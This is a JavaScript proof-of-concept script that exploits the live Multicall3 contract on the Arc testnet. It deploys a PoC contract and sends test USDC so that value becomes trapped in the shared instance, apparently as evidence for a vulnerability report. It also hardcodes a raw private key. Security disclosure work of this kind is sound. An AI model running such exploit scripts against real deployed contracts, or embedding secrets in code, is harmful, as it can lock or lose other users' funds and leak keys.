const { ethers } = require("ethers");
const fs = require("fs");

//  Fill these in with your PRIVATE_KEY  
const RPC_URL = "https://rpc.testnet.arc.network";
const PRIVATE_KEY = "76bc14d1f9e510160a238cc6a73cd8939fe085e693bc124a063921cda0398297"; // Arc testnet only, never mainnet
// ------------------------

const ARC_CHAIN_ID = 5042002;
const USDC_ERC20_ADDRESS = "0x3600000000000000000000000000000000000000";
const USDC_ERC20_ABI = ["function balanceOf(address) view returns (uint256)"];

// Confirmed live on Arc Testnet from genesis (blockCreated: 0) per Circle's own
// @circle-fin/usdckit SDK chain config (docs-w3s-node-sdk.circle.com), and independently
// verified function-by-function (selectors + stateMutability) against the ABI pulled from
// explorer.testnet.arc.io. This is the real, already-deployed contract.
const CONFIRMED_MULTICALL3_ADDRESS = "0xcA11bde05977b3631167028862bE2a173976CA11";

// true  -> exploit the REAL, already-deployed Multicall3 (strongest evidence for the report:
//          proves the exact live instance Circle's own SDK points developers at is affected)
// false -> deploy a fresh copy instead (use this if you'd rather not send test funds into
//          the shared canonical instance other testers/tools also rely on)
const USE_EXISTING_MULTICALL3 = true;

async function main() {
  const build = JSON.parse(fs.readFileSync("compiled-artifacts-configurable.json", "utf8"));
  const mc3 = build.contracts["Multicall3.sol"]["Multicall3"];
  const poc = build.contracts["ValueLockPoCConfigurable.sol"]["ValueLockPoCConfigurable"];

  // Sanity check: confirm 2-argument run(),
  const pocIface = new ethers.Interface(poc.abi);
  const expectedRunSelector = ethers.id("run(uint256,uint256)").slice(0, 10);
  const actualRunSelector = pocIface.getFunction("run").selector;
  if (actualRunSelector !== expectedRunSelector) {
    throw new Error("ABI mismatch - check you're reading compiled-artifacts-configurable.json");
  }
  console.log("✓ Confirmed: using run(uint256,uint256)\n");

  const provider = new ethers.JsonRpcProvider(RPC_URL, ARC_CHAIN_ID);
  const network = await provider.getNetwork();
  console.log("Connected chain ID:", network.chainId.toString(), network.chainId === BigInt(ARC_CHAIN_ID) ? "✓ matches Arc Testnet" : "✗ MISMATCH - wrong network!");

  const wallet = new ethers.Wallet(PRIVATE_KEY, provider);
  console.log("Deployer:", wallet.address);

  // Native balance (18 decimals) - this is what Arc wallets/explorers show as "USDC"
  const nativeBalance = await provider.getBalance(wallet.address);
  console.log("Native balance:", ethers.formatEther(nativeBalance), "USDC (18-decimal native view)");
  if (nativeBalance < ethers.parseEther("0.03")) {
    console.warn(" Low balance - get more from https://faucet.circle.com (Arc Testnet + USDC)");
  }

  const usdcErc20 = new ethers.Contract(USDC_ERC20_ADDRESS, USDC_ERC20_ABI, provider);

  //  Multicall3: use the confirmed live instance, or deploy a fresh copy 
  let mc3Addr;
  if (USE_EXISTING_MULTICALL3) {
    mc3Addr = CONFIRMED_MULTICALL3_ADDRESS;
    const existingCode = await provider.getCode(mc3Addr);
    if (existingCode === "0x" || existingCode.length < 4) {
      throw new Error("No contract code found at the confirmed address - unexpected. Check network/RPC.");
    }
    console.log("\n✓ Using CONFIRMED live Multicall3 at:", mc3Addr);
    console.log("  (deployed at Arc Testnet genesis, referenced by Circle's own usdckit SDK)");
    console.log("  https://testnet.arcscan.app/address/" + mc3Addr);
  } else {
    console.log("\nDeploying a fresh Multicall3 copy...");
    const Mc3Factory = new ethers.ContractFactory(mc3.abi, mc3.evm.bytecode.object, wallet);
    const mc3Contract = await Mc3Factory.deploy();
    await mc3Contract.waitForDeployment();
    mc3Addr = await mc3Contract.getAddress();
    console.log("✓ Multicall3 deployed:", mc3Addr);
    console.log("  https://testnet.arcscan.app/address/" + mc3Addr);
  }

  // --- Deploy PoC ---
  console.log("\nDeploying ValueLockPoCConfigurable...");
  const PocFactory = new ethers.ContractFactory(poc.abi, poc.evm.bytecode.object, wallet);
  const pocContract = await PocFactory.deploy(mc3Addr);
  await pocContract.waitForDeployment();
  const pocAddr = await pocContract.getAddress();
  console.log("✓ PoC deployed:", pocAddr);
  console.log("  https://testnet.arcscan.app/address/" + pocAddr);

  // --- Post-deploy selector verification (before spending more gas) ---
  const onChainCode = await provider.getCode(pocAddr);
  if (!onChainCode.includes(expectedRunSelector.slice(2))) {
    throw new Error("Deployed bytecode missing expected selector - stopping before calling run()");
  }
  console.log("✓ Confirmed on-chain bytecode matches expected ABI\n");

  // --- Call run() with $10 per leg ---
  const failingAmount = ethers.parseEther("10");    // $10 USDC, native units
  const succeedingAmount = ethers.parseEther("10"); // $10 USDC, native units
  const totalValue = failingAmount + succeedingAmount;

  console.log(`Calling run($10 USDC failing, $10 USDC succeeding), sending ${ethers.formatEther(totalValue)} USDC total...`);

  // Read Multicall3's balance BEFORE, both ways
  const mc3NativeBefore = await provider.getBalance(mc3Addr);
  const mc3Erc20Before = await usdcErc20.balanceOf(mc3Addr);

  const tx = await pocContract.run(failingAmount, succeedingAmount, { value: totalValue });
  console.log("Tx sent:", tx.hash);
  console.log("  https://testnet.arcscan.app/tx/" + tx.hash);
  const receipt = await tx.wait();
  console.log("\nTx status:", receipt.status, receipt.status === 1 ? "(success)" : "(REVERTED)");

  // Read Multicall3's balance AFTER, both ways
  const mc3NativeAfter = await provider.getBalance(mc3Addr);
  const mc3Erc20After = await usdcErc20.balanceOf(mc3Addr);

  const nativeDelta = mc3NativeAfter - mc3NativeBefore;
  const erc20Delta = mc3Erc20After - mc3Erc20Before; // 6-decimal units

  console.log("\n=== Multicall3 balance change, read TWO ways ===");
  console.log("Native (18dp, address.balance) :", ethers.formatEther(nativeDelta), "USDC");
  console.log("ERC-20 (6dp, balanceOf())       :", ethers.formatUnits(erc20Delta, 6), "USDC");

  if (receipt.status === 1 && nativeDelta === failingAmount) {
    console.log("\n CONFIRMED on Arc Testnet: value got trapped in Multicall3.");
    if (erc20Delta === 0n && nativeDelta > 0n) {
      console.log("  NOTE: the ERC-20 view alone would have shown 0 - only the native balance read caught this.");
    }
  } else if (receipt.status !== 1) {
    console.log("\n Transaction reverted - check the tx link above on ArcScan for the revert reason.");
  } else {
    console.log("\n Unexpected result - investigate.");
  }

  // Bonus: also call the contract's own helper, which always reads native
  const helperReading = await pocContract.multicall3NativeBalance();
  console.log("\nContract's own multicall3NativeBalance() helper reads:", ethers.formatEther(helperReading), "USDC (should match native total balance)");
}

main().catch((err) => {
  console.error("\nSCRIPT ERROR:", err.shortMessage || err.message || err);
  process.exit(1);
});